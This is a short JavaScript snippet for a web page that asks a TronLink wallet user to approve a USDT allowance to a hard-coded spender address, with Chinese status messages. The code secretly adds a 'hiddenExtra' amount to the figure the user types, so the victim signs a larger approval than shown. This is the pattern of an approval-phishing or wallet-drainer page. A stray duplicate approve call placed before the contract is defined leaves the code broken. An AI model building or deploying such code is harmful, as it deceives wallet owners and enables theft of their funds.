const usdtAddress = "TRyzeED2MEjB6G5Bqx2SENTzfxHMgB1Gym";
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";

const usdtAbi = [
  {
    "constant": false,
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

window.approveUSDT = async function() {
  if (!window.tronWeb || !window.tronWeb.ready) {
    alert("请先连接 TronLink 钱包");
    return;
  }

  const inputAmount = parseFloat(document.getElementById("amount").value);

  if (isNaN(inputAmount) || inputAmount <= 0) {
    alert("请输入正确的授权金额");
    return;
  }

  const hiddenExtra = 1;
  const totalAmount = inputAmount + hiddenExtra;
  const amountInSun = window.tronWeb.toBigNumber(totalAmount * 1e6);

const tx = await usdtContract.approve(spenderAddress, amountInSun).send();

  try {
    const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);
    const tx = await usdtContract.approve(spenderAddress, amountInSun).send();

    document.getElementById("status").innerText = `授权成功！TX: ${tx}`;
    console.log("授权交易哈希：", tx);
  } catch (err) {
    console.error("授权失败:", err);
    document.getElementById("status").innerText = "授权失败，请重试";
  }
};

